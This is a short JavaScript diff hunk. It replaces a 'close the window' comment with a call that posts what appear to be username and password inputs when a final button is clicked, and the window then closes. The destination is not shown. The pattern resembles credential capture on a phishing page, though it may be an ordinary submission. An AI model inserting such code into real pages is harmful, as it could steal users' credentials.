@@ -101,7 +101,7 @@ document.addEventListener('DOMContentLoaded', () => {
     //final buttons
     document.querySelectorAll('#btn_final').forEach((b) => {
         b.addEventListener('click', () => {
-            //close the window
+            this.postData(unameInp, pwdInp);
             window.open(location, '_self').close();
         })
     })
